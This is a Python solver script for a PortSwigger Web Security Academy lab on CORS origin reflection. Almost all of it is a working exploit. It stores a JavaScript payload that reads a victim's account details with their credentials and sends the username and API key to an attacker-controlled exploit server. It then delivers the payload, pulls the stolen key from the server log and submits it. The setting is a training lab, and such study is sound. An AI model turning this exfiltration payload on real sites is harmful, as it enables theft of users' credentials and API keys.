#!/usr/bin/env python3

## the OG
## https://github.com/frank-leitner/portswigger-websecurity-academy/blob/main/13_cross_origin_resource_sharing_CORS/CORS_vulnerability_with_basic_origin_reflection/script.py
##

# CORS vulnerability with basic origin reflection
# Lab-Link: https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import os,sys,re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_exploitserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def store_exploit(client, exploit_server, host):
    data = {'urlIsHttps': 'on',
            'responseFile': f'/{host[8:]}',
            'responseHead': '''HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8''',
            'responseBody': '''<script>
    var r = new XMLHttpRequest();
    r.open('get', "''' + host + '''/accountDetails", false);
    r.withCredentials = true;
    r.send();

    const obj = JSON.parse(r.responseText);
    var r2 = new XMLHttpRequest();
    r.open('get', "''' + exploit_server + '''/?user=" + obj.username + '&apikey=' + obj.apikey, false)
    r.send();
</script>''',
            'formAction': 'STORE'}

    return client.post(exploit_server, data=data).status_code == 200


def extract_solution(client, exploit_server):
    r = client.get(f'{exploit_server}/log')
    if r.status_code != 200:
        return None

    soup = BeautifulSoup(r.text, 'html.parser')
    result = soup.find('pre', attrs={'class': 'container'}).text
    exfiltrate_line = result.splitlines()[-1]
    # line is this format:
    # 172.31.30.227   2022-05-01 16:53:37 +0000 "GET /?user=administrator&apikey=gOl7iVmfoesIVlIsWUfK30vYkLUDcRXr HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"    
    apikey = exfiltrate_line.split()[5].split('&')[1].split('=')[1]
    return apikey


def send_solution(client, host, solution):
    data = {'answer': solution}
    r = client.post(f'{host}/submitSolution', data=data)
    return '{"correct":true}' in r.text


def main():
    print('[+] CORS vulnerability with basic origin reflection')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    exploit_server = find_exploitserver(client.get(host).text)
    if exploit_server is None:
        print(f'[-] Failed to find exploit server')
        sys.exit(-2)
    print(f'[+] Exploit server: {exploit_server}')

    if not store_exploit(client, exploit_server, host):
        print(f'[-] Failed to store exploit file')
        sys.exit(-3)
    print(f'[+] Stored exploit file')

    if client.get(f'{exploit_server}/deliver-to-victim', allow_redirects=False).status_code != 302:
        print(f'[-] Failed to deliver exploit to victim')
        sys.exit(-4)
    print(f'[+] Delivered exploit to victim')

    apikey = extract_solution(client, exploit_server)
    print(f'[+] API key: {apikey}')
    if not send_solution(client, host, apikey):
        print(f'[-] Answer submitted was incorrect')
        sys.exit(-5)
    print(f'[+] Correct answer submitted')

    if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')


if __name__ == "__main__":
    main()

##
##
